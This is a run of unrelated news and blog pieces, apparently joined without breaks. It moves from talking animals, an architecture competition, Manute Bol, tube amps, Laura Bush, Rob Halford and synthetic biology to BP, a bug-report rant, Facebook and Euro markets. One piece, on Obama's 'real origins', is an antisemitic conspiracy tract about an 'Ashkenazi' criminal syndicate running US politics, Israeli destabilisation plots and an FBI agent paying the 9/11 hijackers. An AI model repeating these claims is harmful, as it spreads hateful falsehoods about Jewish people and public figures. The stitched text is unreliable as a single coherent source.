There 's nothing more wonderful than the look of dignity on a dogs face when you dress them in a lobster costume .
Wait , maybe that 's embarrassment .
My bad .
( Mental Floss ) --
There 's no need to page Doctor Doolittle for this case .
Here are the amazing , true stories of four animals that could speak for themselves .
1. Hoover the Seal
In 1971 , George and Alice Swallow found a baby seal just off the coast of Maine .
The little guy appeared to be orphaned , so they took him home and kept him in their bathtub .
For the first few days , they tried to feed him ground mackerel , but he refused to eat .
Once he trusted his new parents , though , he began eating so voraciously they compared him to a Hoover vacuum cleaner and the name stuck .
When he got too big for the tub , Hoover was moved to a small pond behind the Swallows ' house .
After only a few months , Hoover was eating more fish than his human caretakers were able to provide , so they contacted the New England Aquarium in Boston , hoping the facility had room for him .
When introducing the seal to the aquarium , George mentioned that Hoover could talk .
Of course no one believed him at the time .
A few years later , though , researchers at the aquarium noticed that Hoover 's guttural sounds really did seem to be forming words and phrases .
He was often telling people to " Get outta here ! " or asking , " How are ya ? "
He could say his name and a few other phrases , all with a thick Bostonian accent .
Once the word got out that the Aquarium had a talking seal , he became a media sensation , making appearances in Reader 's Digest , The New Yorker , National Public Radio , and even on Good Morning America .
Sadly , Hoover died of natural causes in July 1985 at the ripe old age of 14 .
He was so admired that he received his own obituary in the Boston Globe .
He left behind several offspring , but none possessed his unique gift for gab .
2. Blackie the Cat
Search YouTube for " Talking Cat " and you 'll find thousands of videos of fluent felines .
But in 1981 , a talking cat was a bit harder to come by .
So when Carl Miles of Augusta , Georgia , trained his cat Blackie to say , " I love you " and " I want my mama , " they took their act on the road .
Throughout the early 1980s , Blackie made paid appearances on local TV and radio programs , and even hit the big time with a spot on the network TV show That 's Incredible .
However , as the novelty wore off , Carl and Blackie ended up performing on street corners , asking for donations from passersby .
After some complaints from locals , police informed Carl that he would need to get a business license in order to keep up Blackie 's street show .
Carl paid the $ 50 fee for a license , but something about it rubbed him the wrong way .
So Carl sued the city of Augusta , under the pretense that the city 's business license code mentions many types of occupations that require a license , but a talking cat show was not one of them .
But that was n't the only issue Carl had -- he also claimed the city was infringing on Blackie 's First Amendment Right to Free Speech .
Carl lost his case , but he appealed the ruling until it came before a federal court .
The argument was finally closed when three presiding judges declared that the business license ordinance allowed for other , unspecified types of businesses to require a license , which would encompass a talking cat performer .
As for the First Amendment violation , the courts said the law did not apply because Blackie was not human , and therefore not protected under the Bill of Rights .
Furthermore , there seemed no good cause for Carl Miles to be the one to bring the suit in the first place .
If Blackie felt his rights were being violated , as a talking cat , he should have been the one to say something .
Mental Floss : Animals that were put on trial
3. Alex the Parrot
Alex , an African gray parrot , was purchased from a Chicago pet store in 1977 .
Dr. Irene Pepperberg bought the one - year - old bird to see if she could teach a parrot to understand language in a similar manner to chimpanzees and gorillas that had been taught American Sign Language .
At the time , it was believed that a large brain , like a primate 's , was necessary to acquire language .
By comparison , a parrot 's brain is about the size of a walnut , so it was believed that mimicry was the best we could hope for .
Instead , the work of Pepperberg and Alex ( an acronym for Avian Learning EXperiment ) before his sudden death in 2007 , has changed the perceptions of many in the scientific community .
According to Dr. Pepperberg 's research , this avian Einstein could identify 50 different objects , knew seven colors and shapes , and many different kinds of materials like wool , paper , and wood .
For example , hold up a blue block of wood and Alex could tell you the shape , the color , and even what it was made of .
However , he also grasped more complex concepts that required a higher level of thought and understanding .
Put a handful of red and yellow blocks on a tray and ask him how many were yellow , he could tell you the correct answer .
If you then asked him how many of those same blocks were green , he would say " none . "
Furthermore , hold up two blocks of different colors and different sizes and he could tell you which was bigger .
Maybe the term " birdbrained " is n't such an insult after all .
Despite the loss of Alex , the Avian Learning Experiment goes on .
Dr. Pepperberg 's latest feathered pupil is Griffin , another African Gray , that was born in 1995 .
In 2007 , Animal Planet tested Griffin against kids at a Boston preschool on the basics of object recognition , colors , and shapes .
It was determined that Griffin was about as smart as a three - and - a - half year old human .
Not bad for having a brain the size of a walnut .

4. Lucy the Chimp
When she was only two days old , Lucy , a chimpanzee , was purchased by the University of Oklahoma and sent to live with Dr. Maurice Temerlin , a noted psychologist , who , along with his wife , raised the little chimp as if she were their own human child .
Lucy was taught how to eat normal meals at the table using silverware .
She could dress herself , often choosing to wear skirts just like her " mother " did .
She could even make tea for her " parents " and the team of researchers who trained and cared for her .
Dr. Robert Fouts , one of the groundbreaking psychologists who taught American Sign Language ( ASL ) to Washoe the chimp in 1967 , helped Lucy learn to communicate using around 250 ASL signs .
Lucy could not only give the signs for objects like airplane , ball , and food , but she could also express her emotions with her hands , often " saying " when she was hungry , happy , or sad .
Lucy had become so close to human in most every way that she only found human men , not male chimpanzees , sexually attractive .
It was pretty clear that , in her mind anyway , she was the same as her parents .
It 's a sad fact that once a captive chimp has reached about four or five years old , their immense strength can become a danger to their human caretakers .
Often they need to be placed in a zoo , a lab , or some other facility better equipped to handle primates .
In this case , the Temerlins raised Lucy as their daughter until 1977 , when she was almost 12 years old , before they finally felt like they had to find her a new home .
After much deliberation , they decided upon a nature preserve in Gambia on the west coast of Africa .
They , along with research assistant Janis Carter , flew with Lucy to her new home to help ease the chimp into the wild .
However , it was not going to be as simple as they 'd hoped .
At the preserve , Lucy was put in a cage at night to protect her from predators .
She had only ever slept in a bed inside a nice , quiet , suburban home , so the jungle was a completely new and frightening environment for her .
She was also scared of the other chimps , strange creatures she had only encountered a few times before in her life , preferring to stay close to her parents and Janis whenever she could .
She was n't eating because her food had always been delivered to her on a plate ; she did n't even understand the concept of foraging .
When her parents suddenly became distant and were n't providing her with the life she had always known , Lucy became confused and sad .
She would often use the sign for " hurt . "
And she lost much of her hair due to the stress of her new situation .
Realizing that Lucy would never move on if they stayed , her parents left her behind after three weeks .
Janis agreed to stay for a few weeks longer , but it was soon clear that Lucy could n't change who she was .
And so , Janis never left .
Mental Floss :
How do you transport a whale ?
Janis helped found a chimpanzee sanctuary on an abandoned island in the middle of the Gambia River .
She took Lucy and other chimps that had been raised in captivity and lived with them on the island , teaching them skills they would need in the wild , like finding food and climbing trees .
For most , the new lifestyle quickly became second nature .
But for nearly eight years , Lucy refused to give up her human ways .
She wanted human food , human interaction , and to be loved by , what she considered , one of her own kind .
It was n't until Janis stopped living on the island that Lucy was finally able to accept her new life and joined a troupe of chimps .
Whenever Janis visited the island , Lucy was still affectionate , still used sign language , but thankfully , she always went back with the chimps into the forest .
Sadly , Lucy 's decomposed body was discovered in 1987 .
Her exact cause of death is unknown , though some believe she was killed by poachers .
Others say it was probably something less spectacular , like an attack by a dominant male or an illness .
There 's one thing that no one who knew her wonders about , though , and that 's the fact that Lucy never really believed she was anything less than human .

If you 've been following along with us here over the last few weeks , you 've surely noticed that we 've been bashing open architecture competitions and even suggesting alternatives to these time wasters .
So you may find it a bit hypocritical that today I 'm announcing that we won a competition .
That is , until you note the following differences between this competition and a typical open architecture competition .
Not Just an Architecture Competition
The competition we entered was through the Urban Land Institute ( ULI ) to develop housing for the chronically homeless .
As I posted back in April , it was a team development competition consisting of other young real estate and social work professionals .
Architecture was only a piece of the proposal .
Our team had to find a property , create a program , design a project , determine the services offered , and develop a detailed pro forma of how the project would be financed .
The process simulated a real project compressed into six weeks .
The site we selected in Glendale .
The Competition Was n't Open
Our team had to apply in order to get accepted to participate .
There were only five teams competing .
We even got to make our own cool logo .
We were called Team HETED ( Homeless Empowerment Through Efficient Development )
Collaboration
Each team was assigned a city to work with in Los Angeles County : Pasadena , Whittier , East Dominguez Hills , Long Beach and our sponsor city , Glendale .
We also worked closely with homeless non-profit advocates and developers , Path Achieve Glendale and Path Ventures .
The city and these organizations acted like our clients .
By working with them we got to make real connections .
Connections that could lead to future work .
The project concept is a hybrid of preservation of 1920's bungalows and modern intervention of adding new elements to bring the project up to code and provide services for the residents .
Team Aspect
Our team really enjoyed working with each other on this .
I think we will collaborate again on future projects .
Exposure
The Urban Land Institute is a diverse organization .
It reaches all types of real estate professionals .
We prefer this type of exposure over showcasing our work to a bunch of fellow architects .
Pro Bono
This competition was our launch into pro bono work .
We spent 130 hours working on this competition .
This gives us a real gauge as to the level of commitment required to do future pro bono projects .
We already have an idea for our next pro bono project .
It wo n't be through a competition .
Overall view of the project
Whether or not you buy our arguments for entering this competition , I encourage you to check out our winning proposal .
You can also view our online press release .
What do you think of our proposal ?
Former NBA center Manute Bol died of complications from Stevens - Johnson Syndrome , according to a family member who talked to the Washington Post .
He died at the University of Virginia Hospital in Charlottesville on Saturday morning , according to Tom Prichard , an associate of Bol ’s , in an e-mail to the Associated Press .
The former NBA center , known for his shot - blocking skill , was hospitalized in mid-May after returning from a trip to Sudan .
Bol , of Sudanese descent , was one of the tallest players in NBA history at 7 - feet , 6 - inches .
He played for the Washington Bullets , Golden State Warriors , Philadelphia 76ers and Miami Heat .

Bol dedicated his post NBA career to humanitarian efforts in his home country .
Design And Build Your Own Tube Guitar Amp
by Kurt Prange
Why Tubes ?
If you ’re not an electric guitar player or if you ’re just starting out , you might ask why anyone would build anything with tubes .
Are n’t vacuum tubes an obsolete technology ?
Well , yes and no .
While tubes are no longer the technology of choice in the computer industry , they are very much alive and well when it comes to modern high - end guitar amplification .
It is because of the electric guitar amp that vacuum tubes are still being manufactured today .
Visit your local guitar store and take a peek at the rear side of the amps , you ’ll most likely see a variety of glass tubes projecting from the amp chassis .
Guitar amps with tubes are currently front and center in the high - end market because many guitar players find their sound characteristics to be superior to solid - state amps ( i.e. amps with transistors as the main active electronic devices ) .
Modern mass produced tube amps use printed circuit boards to connect components , but at the extreme high - end there are “ boutique ” amp builders who hand wire connections from point - to - point and select high quality components .
Point - to - point wiring is how vintage guitar amps from the 1950 ’s and 60’s were wired and it ’s a technique that allows for easy maintenance and circuit modification .
DIY and the Boutique Amp Builder
Boutique amp builders are individuals or small companies who build a relatively small number of amps each year with an emphasis on quality and attention to detail .
Boutique amps are usually priced in the thousands of dollars , because they require a lot more time and skill to produce .
The builders will often customize circuit designs to satisfy the different tastes and styles of individual guitarists .
Most boutique amp builders at one time started out as electronics hobbyists who thought it would be fun to modify or build their own tube amp .
The internet continues to make it easier to find books and parts to help you build your own boutique quality guitar amp .
Suggestions for a First Build
The quickest way to get acquainted with the parts and standard layout techniques used in tube amp building is to build an amp kit .
Most kits come with a pre-punched chassis , parts and instructions to assist you in building it .
If you ’re interested in more of a challenge than building a kit , classic tube amp schematics are easy to find on - line and their patents are likely to be long since expired .
Find a Fender schematic and its related layout drawing and start making a parts list .
Most of the boutique amps being made today are cloned vintage Fender and Marshall amps or at least heavily influenced by their circuits .
There are also many books on the subject of tube amp circuit theory , design and building that you can read to help make your first build of boutique quality .

Only several years after it might have made any difference , Laura Bush publicly supports gay marriage and abortion
If you 'd harboured doubts that Laura Bush was n't the red - blooded conservative type – in the mould of Dick Cheney 's wife Lynne , who is possibly even more awe - inspiring than the former vice president – then you were right .
Doing the round of TV talkshows , punting her mildly interesting autobiography Spoken from the Heart , Laura Bush last night visited Larry King 's CNN chatshow – an ancient US tradition , similar to an incoming British prime minister kissing the Queen 's ring .
During the interview she makes it clear that she supports gay marriage and – in some circumstances – a woman 's right to choose abortion .
All of which puts her slightly to the left of the current occupant of the White House .
Which is great but ... now you tell us .
In the current climate within the Republican party , a presidential candidate 's wife with such views would probably be stoned to death .
Figuratively speaking .
But it does show that even within today 's Republican party – assuming you can define Laura Bush as a Republican – there is still a fragment of the sensible right remaining .
Anyway , here 's the CNN transcript :
Larry King : Gay marriage , you tell us in the book that during the 2004 campaign you talked to George about not making it a significant issue .
Do you think we should have it ?
Laura Bush :
Well , I think we ought to definitely look at it and debate it .
I think there are a lot of people who have trouble coming to terms with that because they see marriage as traditionally between a man and a woman .
But I also know that , you know , when couples are committed to each other and love each other , that they ought to have I think the same sort of rights that everyone has .
King :
So would that be an area where you disagreed ?
Bush : I guess that would be an area that we disagree .
I mean , I understand totally what George thinks and what other people think about marriage being between a man and a woman .
And it 's a real , you know , reversal really for that to accept gay marriage .
King :
But you do ?
Bush :
But I think we could , yeah .
I think it 's also a generational thing .
King :
You think it 's coming ?
Bush : Yeah , that will come , I think .
King : How about choice ?
Bush : I write in the book about the very first question I got on the morning of George 's inauguration , from Katie Couric , who asked me two questions about abortion .
That was the social issue in 2000 that everyone got asked about .
And then I think gay marriage was the social issue in 2004 .
And I was say probably in the more recent election as well .
She asked me ... two questions about abortion , and then she asked me if I was for the overturn of Roe versus Wade .
And sort of everything went through my mind .
This was the very morning my husband was about to be inaugurated .
And I thought , do I really want to start my husband 's presidency , you know , suggesting that a Supreme Court rule being overturned .
And I said no .
And I think it 's important that it remain legal , because I think it 's important for people , for medical reasons and other reasons .
Who knows , maybe she voted for John Kerry in 2004 ?
Thirty years ago Rob Halford led Judas Priest , and heavy metal itself , out of the Midlands and into the bigtime .
He tells us where the sound – and the look – came from
Peering from the window at his management company 's offices in north London , Rob Halford assesses the sunny spring day outside .
" Hmm , very nice , " he says in his West Midlands tones , at once dolorous , friendly and a little puzzled – the wonderful Zen- bemusement of the Brummie accent .
" Very nice , but I 'm not sure if spring is very heavy metal .
I think winter is the most heavy metal time of year .
You have storms , ice , stuff like that . "
Halford should know what is and is n't heavy metal .
He 's the singer in Judas Priest , who were crucial to the genre 's genesis , something underlined by this month 's 30th - anniversary reissue of their definitive album , British Steel .
A charming and drolly humorous man with a screaming four - octave air - raid siren of a voice , Halford is the perfect ambassador for both heavy metal and Judas Priest .
Halford 's story has included arguments over bullwhips with Marie Osmond backstage at Top of the Pops , and being a covertly homosexual frontman singing a song called Hell Bent for Leather ; there have been on - stage motorcycle accidents and parallels with the film This Is Spinal Tap .
And while doing all that , Judas Priest helped form one of our planet 's most enduring and pervasive musical forms .
Judas Priest 's visual style – the head - to - toe leather and studs – and churning , riff - laden rock have influenced bands from Van Halen to Metallica , to Slipknot and beyond .
In the process , they 've affected our wider cultural fabric .
Priest and their spawn have ingrained heavy metal and its comic - heroic ritual into our language and dress .
But while heavy metal has gone international , the British Steel album – the record that , more than any other , codified what we mean by " heavy metal " – had a profoundly local origin .
With Judas Priest , the Midlands and metal reinforce one another with a wonderful literal - mindedness .
Halford 's dad was employed at a Walsall metalworking company , making components for nuclear reactors .
Guitarist Glenn Tipton not only shares his surname with a Midlands town but was also an apprentice at British Steel .
Judas Priest are the sound of the blast furnaces that once studded the Midlands .
" When we were kids walking to school , " says Halford , " we 'd walk past these metal foundries and see the molten metal coming out of the big vats .
We were literally breathing in the fumes from these metal works , breathing in metal before heavy metal had even been invented .
I 'd be in school trying to do English literature and the classroom would be shaking because of the machinery . "
" We really did grow up in a labyrinth of heavy metal , " says Tipton .
" Huge foundries , big steam hammers .
It also gave you a determination to get out . "
Music was the way chosen by the members of Judas Priest .
The band formed in 1969 , gigging around the West Midlands as a quartet with original singer Al Atkins until 1973 .
That year , their fortunes changed , when Halford replaced Atkins , a change reinforced when guitarist KK Downing recruited Tipton to join him .
It was a slow grind to success , though .
They had released five albums – moving from blues rock to pure metal – before British Steel took them to No 4 in the UK album charts and the US top 40 , and its three hit singles – Breaking the Law , United and Living After Midnight ( which they later performed on Live Aid ) – brought them to wider attention via Top of the Pops .
Even when they were international stars , though , Judas Priest were dragged into trouble .
In 1985 , two young Americans , James Vance and Raymond Belknap , spent an afternoon drinking , smoking dope and listening to Judas Priest .
Belknap subsequently killed himself with a shotgun .
Vance maimed himself , dying three years later .
The pair , it was later claimed , had been prompted by a subliminal message urging " Do it ! " hidden on the 1978 song Better By You , Better Than Me .
The men 's parents sued , though when the case finally came to court , in Reno , Nevada in 1990 , it was dismissed .
Halford later observed that for a rock band to insert subliminal messages urging suicide was n't a sensible way to build a fanbase .
Better , he suggested , to insert the command : " Buy more of our records . "
Less troubling were the band 's parallels to the fictional metal band Spinal Tap .
" I loved it , " says Halford of This Is Spinal Tap .
" But I 've always said you can only make satire out of greatness .
Everything 's relative to that film .
I went to Elvis 's grave .
I 've said ' Hello Cleveland ' when I 've been in Detroit and we 've definitely got lost on the way from the dressing room to the stage .
In fact , we once got lost on the way to the fucking tour .
We got off a ferry and could n't find the bus . "
Spinal Tap planned a musical , Saucy Jack , based on the Jack the Ripper story .
Judas Priest predated this with Ripper , their own song about murder by gas lamp .
The tale of the Ripper has featured in grand guignol theatre and music hall , and Judas Priest seem to touch on this tradition .
Massively populist , they sometimes seem like music hall rerouted through Marshall stacks .
And , as with theatre , there have certainly been costume changes .
In the late 1970s , Halford emerged with a new leather - man look .
When Judas Priest started making regular appearances on Top of the Pops , Halford was boldly accessorised with biker cap and bullwhip .
" Priest on Top of the Pops was absolutely spectacular , " says Halford .
" Once we were on with the Osmonds .
I had my whip with me and I 'd heard Marie was n't happy about that .
So , I went to see her in her dressing room with her curlers in . "
Did he use the whip on the show ?
" Of course I did .
I 'm not going to have any Mormon telling me what I can and can't do with my whip .
Us being on Top of the Pops was great for heavy metal .
We were the first band to go out with that particular look .
Once it was there on stage and was being photographed , it just shot around the world .
It just looked right – it looked like the music sounded . "
Despite the homoerotic overtones of Halford 's new look , he kept his homo–sexuality under wraps , not coming out until 1998 – in the middle of the period from 1991 - 2003 during which Halford had left the band .
Presumably , Judas Priest 's origins – the macho world of metal combined with the macho Midlands – might not have been particularly welcoming toward Halford 's sexuality ?
" Absolutely not , " he says .
" I understood that it could have been destructive .
People were fascinated , but what would the knock - on effect have been ?
As it turned out , when I came out of the closet I was away from Priest .
Back in the 1980s , though , I think there could totally have been a backlash .
You protect your interests , do n't you ?
I was also thinking about the rest of the band . "
But were there clues on British Steel ?
The scream of " You do n't know what it 's like " on the track Breaking the Law .
Most particularly , some of the lyrics to Grinder : " Never straight and narrow … Been inclined to wander off the beaten path . "
" It would have been subconscious , " says Halford , " But quite possibly , yes .
I think that 's the first time I 've ever been asked that question and , yes , subconsciously , maybe that 's what it was .
It certainly felt right .
Why would I say ' Never straight and narrow ' ? "
And what about the leather ?
Was that also a signal ?
" It was n't conscious .
But how ironic that I chose that look – Glenn , the biker from the Village People .
That was n't my attachment , in terms of the gay community , but I understood the power of that look . "
Alongside the biker togs Halford has used a Harley - Davidson motorbike as a stage prop , rolling out from the wings at the start of Hell Bent for Leather .
During an August 1991 show in Toronto the bike collided with a drum riser that was hidden amid dry ice , breaking Halford 's nose .
He completed the gig before going to hospital .
There was also a motorbike challenge to Freddie Mercury , issued live on Radio 1 .
Halford was supposedly outraged by Freddie 's disgraceful employment of a static motorbike in Queen 's video for the Crazy Little Thing Called Love single .
He suggested a motorbike race .
" I never heard back from him , " says Halford .
" Freddie is my ultimate hero .
The closest I ever got to Freddie was in a gay bar in Athens on the way to Mykonos .
We kind of glared at each other across the bar , in a kind of smiling , winking way .
When we got to Mykonos I was determined to track him down , but I could n't because he 'd rented this huge yacht .
It was festooned in pink balloons and it just kept sailing around the island .
He 's someone I wish I 'd really met . "
Freddie , sadly , is no longer with us .
But , as Queen once did , Judas Priest are still here to enshrine one of pop music 's most important conjunctions – the place where the glorious collides head - on with the ridiculous .
" Is n't it great ? " he says with pride in his voice and a twinkle in his eye .
" The blade is still as sharp as ever , 30 years later , still cutting through the metal world . "
The 30th anniversary edition of British Steel is out now on Columbia
Has man indeed made life ?
I think not .
The replica is indistinguishable in form and function from the original .
Were it not for marker tags introduced into the replica DNA , there would be no difference at all .
It is as if one were to create a copy of Michelangelo 's David , accurate down to the last crack and imperfection except for the signature , and call it new .
Is the organism so created useful ?
No more so than the original , most famous for being small , with no known use outside the laboratory .
Will this work open a new era of modern biology ?
Again unlikely .
That door was opened some time ago with the advent of genetic engineering that allows functioning genes of one organism to be inserted into another ( think of the human gene for insulin inserted in bacterium to produce the replacement hormone for diabetics ) , and more recently by mixing and matching the genes from many different species to create new useful biochemical pathways .
For example , nine different genes , some from bacteria and some from plants , were spliced into yeast DNA to direct the production of an anti-malarial drug previously only obtainable from a tropical plant .
Similar methods have already been used to ferment diesel and jet fuel .
These techniques are part of a rapidly growing field I call " constructive biology , " but now goes by the unfortunate name " synthetic biology . "
Does this experiment raise new moral and ethical issues ?
This genie has long been out of the laboratory flask .
For decades we have had the ability to genetically alter life forms to suit our purpose .
The vast majority of applications have been for good : to heal the sick and feed the hungry .
If the technology has been seriously misused , the results are hidden , shrouded in secrecy , perhaps in military laboratories .
Yes , we must be vigilant as always , but these new results do not change the game .
We want to hear what you think about this article .

WASHINGTON ( Reuters ) - BP
Plc installed a type of cement casing on its now - ruptured undersea well that it knew ran the risk of leaking gases in order to save money , The New York Times reported on Wednesday , citing a BP document it received from a congressional investigator .
Workers from the Deepwater Horizon oil rig and the energy company have said that gases were leaking through the casing hours before an explosion caused a massive oil spill in the Gulf of Mexico .
Investigators have said the leaks could have caused the explosion .
The casing pipe that lined the well had cement that , if it did not seal properly , would allow gas to leak to the wellhead , where there was only a single barrier , the Times said .
Using a different type of casing would have created two barriers .
The newspaper said the company decided to use the casing several days before the explosion .
It was installed by the contractor Halliburton .
BP said the riskier single barrier option made the best economic case , according to the newspaper .
On Wednesday , federal investigators said the cementing on the well must have failed at some point .
Halliburton has defended its work , saying that all of its cementing procedures were dictated by BP .
THE REAL ORIGINS OF BARACK “ HUSSEIN ” OBAMA
By Jeff Gates / Staff Writer / Editor ( 2nd in a series )
Be not deceived by Barack Hussein Obama ’s middle name or by the fact that he spent several childhood years in Indonesia .
His political career is a product of a Westside Chicago Ashkenazi network with roots that trace directly back to organized crime of the 1920s .
Top fundraiser Penny Pritzker traces her family lineage to grandfather Abe and great - grandfather Nicholas who served as lawyers for organized crime .
She declined a nomination as Secretary of Commerce in the Obama Cabinet , a post typically offered top fundraisers .
Her confirmation hearings could have proved a political embarrassment by reminding us of the suspect origins of “ our ” latest president .
Clinton White House counsel Abner Mikva aptly described this high - profile product of the Chicago Outfit as “ the first Jewish president . ”
Plus his Vice President , only a heartbeat from the reins of power , is the reliably obsequious Joe “ I am a Zionist ” Biden .
http://www.youtube.com/watch?v=yAZmO80dLfE
For his Secretary of State , Obama appointed a presidential rival , Hillary Clinton , whose political career traces to the same source .
After serving as First Lady in the presidency of Arkansas native Bill Clinton , she fled to New York to run for the U.S. Senate knowing she could not win an election - any election - in Arkansas where she is widely reviled .
By staking out extreme pro-Israeli positions , she joined New York Senator Charles Schumer as , in practical effect , the second Jewish Senator from a key electoral state long dominated by this trans - generational criminal syndicate .
The chiefs of staff for Barack and Michele Obama are both Ashkenazim from Chicago , long a center of foreign espionage .
That fact was recently reconfirmed by Federal Bureau of Investigation translator Sibel Edmonds when , from FBI wiretaps , she documented the close working relationship between the Israel Lobby and U.S. officials with power over policy making in the Middle East , including Richard Perle , Wolfowitz understudy Douglas Feith and key members of Congress .
http://sabbah.biz/mt/archives/2009/11/20/whos-afraid-of-sibel-edmonds/
Earlier this month , a Chicago man whose father was a Pakistani diplomat was charged with involvement in planning “ India ’s 911 . ”
In practical effect , the murder of 166 people in Mumbai , India ’s financial center , accelerated the destabilization of Pakistan by drawing troops out of the western provinces for redeployment along the eastern border with India .
See :
What is Israel ’s Role in the Destabilization of Pakistan ?
http://www.opinion-maker.org/navigation.do?mode=showArticles&id=1037
Why Outside Help Is Required
The same syndicate working to destabilize Pakistan is also destabilizing the U.S. - from the inside .
That ’s why ordinary Americans need the assistance of Pakistanis and others outside the U.S. to restore some semblance of representative government .
The confidence with which this game theory aggression progressed in plain sight could be seen in the behavior of Deputy Defense Secretary Paul Wolfowitz , a key Zionist insider .
Four days after 9 - 11 while in a principals ’ meeting at Camp David , a presidential retreat outside Washington , he proposed that the U.S. invade Iraq .
At that time , the intelligence did not point to Iraqi involvement and Osama bin Laden was thought to be hiding in a remote region of Afghanistan .
On that same day , San Diego FBI Special Agent Stephen Butler interrogated Iraqi Munther Ghazal at his home near San Diego to determine if he was funding Mel Rockefeller with whom Ghazal traveled to Baghdad in early 1997 .
After meeting for several days with Nidhal al - Hamdani , a top nuclear physicist with oversight of Iraq ’s mothballed nuclear weapons program , Rockefeller returned to the U.S. with a practical proposal for removing Saddam Hussein without this war and without triggering a violent and destabilizing insurgency .
When regional specialists at the U.S. Department of State declined to meet with him , he traveled to Ottawa in April 1997 where he met with Middle East specialists in the Canadian government to ensure a written record would confirm there was an alternative to war in Iraq - six years before the invasion .
Instead of debriefing him , FBI agents sought to discredit him .
Though FBI agents interviewed Munther Ghazal numerous times , they have yet to meet with Mel Rockefeller .
Four packages sent to the Phoenix divisional office of the FBI documenting ongoing treason and criminal stalking were returned , marked “ refused . ”
FBI Special Agent Butler cashed checks and paid rent for the two San Diego - based hijackers who piloted planes into the World Trade Center towers .
The same Iman who counseled Major Nidal Hasan ( with FBI knowledge ) before he was transferred to Fort Hood - where he went on a shooting spree - also counseled the San Diego - based hijackers - likewise with FBI knowledge .
As of December 18 , 2009 , no one from either federal law enforcement or national security had debriefed Mel Rockefeller - eight years after 9 - 11 .
Had he been engaged in good faith in early 1997 after his return from Baghdad or in early 2001 after his return from Jakarta , the facts suggest that 9 - 11 might well have been prevented .
Good faith engagement after 9 - 11 could have prevented the invasion of Iraq .
Instead , extraordinary steps were taken to discredit him .
When President George H.W. Bush declined to invade Baghdad to remove Saddam Hussein during the 1991 Gulf War , Pentagon Under Secretary for Policy Paul Wolfowitz imposed a No - Fly Zone in northern Iraq .
By the time that the invasion of March 2003 began , the Israeli Mossad had more than 100 agents deployed for a decade in the northern Iraqi city of Mosul .
Intelligence reports of Iraqi ties to Al Qaeda were also traced to Mosul - reports that proved false .
Mosul again emerged in November 2004 as a center of the insurgency that destabilized Iraq .
That reaction precluded the speedy exit of coalition forces promised in Congressional testimony by senior war - planner Wolfowitz .
In the lead - up to the invasion , Wolfowitz assured policy - makers of a swift and welcome regime - change whose $ 50 billion cost would be recovered from the proceeds of Iraqi oil .
Nobel laureate economist Joseph Stiglitz has since projected the total cost will exceed $ 3,000 billion , all of it borrowed .
That total , 60 times the original estimate , includes $ 700 billion in interest paid on war - related debt .

When you ask for help , try not to ask in the most inconvenient way possible
I just received a bug report by email which had a 6MB attachment .
This meant that I could n't preview it with my mail monitor program , which meant I had to wait until I could launch my regular email client and download the email to decode the attachment .
When I opened it , it turned out to have a PDF file in it , which then contained a 1920x1080 image of the person 's entire desktop , in which the only thing interesting to me was VirtualDub 's tiny crash dialog in the center -- which says to attach the diagnostic text file instead , because the dialog itself does n't contain detailed crash information .
Please , folks , when you 're asking other people for help , try to be sensible .
There are already enough reasons why your email might not be answered ; you do n't need to give the person another one .
The downside with being top dog is you 're going to take shots from all directions .
The upside is you probably do n't care .
So it is with Facebook , which lately has been taking a lot of criticism aside from the usual " I hate the new design . "
A coalition of consumer groups this week filed a complaint with the Federal Trade Commission about what it said were misleading privacy policies on the social network .
That followed news that a group of U.S. senators had asked Facebook to change its privacy settings .
Then the other day , a security flaw temporarily allowed users to see private chat messages .
Then there 's the controversial deployment of the " like " button , which , if you believe Slate tech writer Farhad Manjoo , is part of the company 's plan to " take over the Web . "
On top of all that , they 've probably got James Bond tied up somewhere at their headquarters .
A widely circulated blog this week offered " 10 Reasons to Delete Your Facebook Account , " ranging from Facebook CEO Mark Zuckerberg 's " documented history of unethical behavior , " the contempt for privacy and the interface itself , with its " thousands upon thousands of crappy applications . "
To that list , I 'll add that Facebook chat is about the most annoying thing in the history of things .
Before I figured out how to disable it , my ( fairly obsolete ) computer would crash almost daily , when someone from the past -- usually a high - school friend -- popped in to say " what 's up ? "
What 's up , as in , what am I doing at this exact moment that I would have to provide context for ?
Or what 's up , as in , what have you been doing in the 10 years since we last talked ?
Anyway .
Has anybody out there walked away from Facebook and lived to tell the tale ?
( Oh , and while you 're at it , join The Grand Rapids Press on Facebook ! )
The Wolfpack Fund is likely to fail .
With the $ 1T Wolfpack Plan , the central banks are “ all in ” and have no more pieces to shuffle on the board .
The wolves can concoct short positions faster than Europe can create money via the magic of synthetic CDSs .
When Soros called the Bank of England ’s bluff in 1992 , he had to play with real money .
Now he plays with derivatives .
Wolfpack is the endgame of a series of moves by Greenspan ( and Bernanke ) since 1987 , to flood liquidity against any banking panic : Mexico , Asian Flu , Russia , LTCM , Y2 K , dot-com , 9/11 , housing , TARP , TALF and QE .
The moves became known as the Greenspan Put , the assumption that he would bail you out of risky deals .
It reached its ultimate expression in the period that I call the Greenspan Indian Summer , the bubble from 2002 - 2007 that staved off Kondratieff Winter for the moment .
Greenspan knew he was playing with history .
Greenspan ’s Indian Summer ended with the Mother of All Margin Calls , a post of mine on June 15 , 2007 , predicting the end of the bubble and the top in the market .
Where this might lead is to a new global reserve currency , but that is still a ways off .
Right now the Euro is at risk , not yet the Dollar .
After a period to sort out the new plan , the Euro should fall and the Dollar should rise .
As this next chart shows , the Euro popped over the weekend and faded back down today .
The bluff may be called quickly .
Credit Writedowns cites Marc Chandler ( the global head of Brown Brother Harriman ’s top ranked Currency Strategy Team ) for noting that today was still a wait - and - see attitude : the panic is gone but bonds from the “ peripheral euro zone ” have not returned to normal .
Marc believes policymakers are repeating the mistakes of the ’30s .
Behind Wolfpack is the potential for European QE and Eurozone inflation .
The plan is supposed to avoid QE via sterilization : when central banks across Europe buy toxic sovereign debt ( putting Euros into the bondholders ’ accounts ) , the ECB is supposed to sterilize the issuance by selling quality bonds , likely German Bunds ( pulling Euros out of the market ) .
But if the toxic debt is bought at too high a value , the buyers will take a bath that the ECB will try to cover , putting excess Euros into the system .
Euro inflation will push it even lower against the Dollar .
What is unclear is how fast this will play out .
If markets are back to where they were last Friday by the end of this week , the bluff has been called and the momentary hope will fade .
What this means for stocks and bonds I will cover then , but right now note two points from the very interesting STU this evening :
“ The world does not have enough revenue to service the debt built up over the past seven decades ”
The unfolding crisis will be “ too big too bail ”
In one of those moments EWI calls Beautiful Pictures , the bounce today retraced almost precisely 61.8 % of the drop off the Apr26 high , typical for a wave 2 .
The alt count of an extended fifth with a zigzag ( = sharp ) bounce has played out , not the wave 3 down with a fourth wave triangle bounce .
The implication is more upside before the next big drop .
